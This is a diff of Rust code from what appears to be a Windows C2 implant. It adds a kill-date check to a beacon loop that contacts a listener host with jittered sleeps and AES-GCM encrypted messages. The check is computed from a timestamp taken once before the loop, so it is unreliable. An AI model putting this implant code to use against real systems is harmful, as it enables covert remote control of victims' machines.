@@ -1,6 +1,7 @@
 // References:
 //  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
 //  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
+use chrono::{NaiveDateTime, Utc};
 use regex::Regex;
 use std::{
     fs,
@@ -30,7 +31,10 @@ use crate::{
     },
     Config,
     crypto::aesgcm::{cipher, decipher, EncMessage},
-    utils::random::{random_name, random_sleeptime},
+    utils::{
+        datetime::{expires_killdate, get_killdate},
+        random::{random_name, random_sleeptime},
+    },
 };
 
 pub async fn run(config: Config) -> Result<(), Error> {
@@ -40,7 +44,12 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
     let user_agent = HSTRING::from(config.listener.user_agent.to_string());
 
-    let hsession = HSession::new(user_agent)?;
+    // Parse the kill date
+    let now = Utc::now().naive_utc();
+    let killdate = get_killdate(config.killdate.as_str());
+
+    // Initialize the session
+    let mut hsession = HSession::new(user_agent)?;
     let mut hconnect = HConnect::new(
         &hsession,
         HSTRING::from(config.listener.host.to_string()),
@@ -97,6 +106,10 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
     loop {
         // TODO: Implement graceful shutdown.
+
+        if expires_killdate(killdate.clone(), now.clone()) {
+            break;
+        }
 
         thread::sleep(
             random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
